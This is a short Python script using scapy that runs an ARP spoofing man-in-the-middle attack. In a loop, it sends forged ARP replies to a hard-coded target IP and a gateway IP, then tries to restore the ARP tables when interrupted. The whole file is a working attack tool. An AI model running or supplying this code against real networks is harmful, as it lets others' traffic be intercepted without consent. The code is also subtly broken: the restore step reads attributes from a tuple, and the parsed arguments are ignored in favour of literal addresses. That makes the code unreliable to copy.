import scapy.all as scapy
import time
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", default="172.16.13.27", help="Target IP")
    parser.add_argument("-g", "--gateway", dest="gateway", default="172.16.255.254", help="Gateway IP")
    args = parser.parse_args()
    return args.target, args.gateway
# Get target mac address using ip address


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    #print(answered_list)  # Add this line to see what answered_list contains
    return answered_list[0][1].hwsrc if answered_list else None
# Change mac address in arp table


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
                       psrc=spoof_ip)
    scapy.send(packet, verbose=False)
# Restore mac address in arp table


def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
                       psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

    
options = get_arguments()
sent_packets_count = 0
try:
    while True:
        spoof("172.16.13.27", "172.16.255.254")
        spoof("172.16.255.254", "172.16.13.27")
        sent_packets_count += 2
        print(f"\r[+] Packets sent: {sent_packets_count}", end="")
        time.sleep(0)
except KeyboardInterrupt:
    print("\nCTRL+C pressed .... Reseting ARP tables. Please wait")
    restore(options.target, options.gateway)
    restore(options.gateway, options.target)
    print("\nARP table restored. Quiting")